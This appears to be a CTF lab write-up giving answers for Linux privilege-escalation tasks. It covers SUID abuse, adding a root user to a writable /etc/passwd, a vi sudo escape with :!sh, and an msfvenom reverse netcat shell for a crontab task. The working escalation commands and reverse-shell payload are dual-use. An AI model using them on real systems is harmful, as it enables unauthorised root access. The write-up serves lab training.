## Task - 5: Abusing SUID/GUID Files

**Q: What is the path of the file in user3's directory that stands out to you?**

Answer: /home/user3/shell

Hint: find / -perm -u=s -type f 2>/dev/null (this will find all the files with SUID bit set)

**Also need to run this script ./shell  and it will give you root access**

## Task -6: Exploiting Writeable /etc/passwd

**Q: Having read the information above, what direction privilege escalation is this attack?**

Answer: vertical 

**Note: Exit from root user and enter as user7**

**Q: Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]"**

**What is the hash created by using this command with the salt, "new" and the password "123"?**

Answer: $1$new$p7ptkEKU1HnaHpRtzNizS1

Solution: user7@polobox:/home/user3$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

**Q: Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for**
**a root user with the username "new" and the password hash we created before?**

Answer: new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root/bin/bash

(add this new user at very last of /etc/passwd with nano or vim editor. Exit and try to login with new user)

## Task - 7: Escaping Vi Editor

**Q: Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?**

Answer: nopasswd

**Note:** There is not much task but important logic to escape privileges by opening vi with sudo and typing :!sh, it will give you root access

## Task -8: Exploiting Crontab

**Q: What is the flag to specify a payload in msfvenom?**

Answer: -p 

**msfvenom -p cmd/unix/reverse_netcat lhost=$LOCALIP lport=8888 R**
**This script will generate reverse shell , use your IP. This payload will create a reverse shell connection to the IP address $YOUR_IP on port 8888** 

**Q: What directory is the "autoscript.sh" under?**

Answer: /home/user4/Desktop
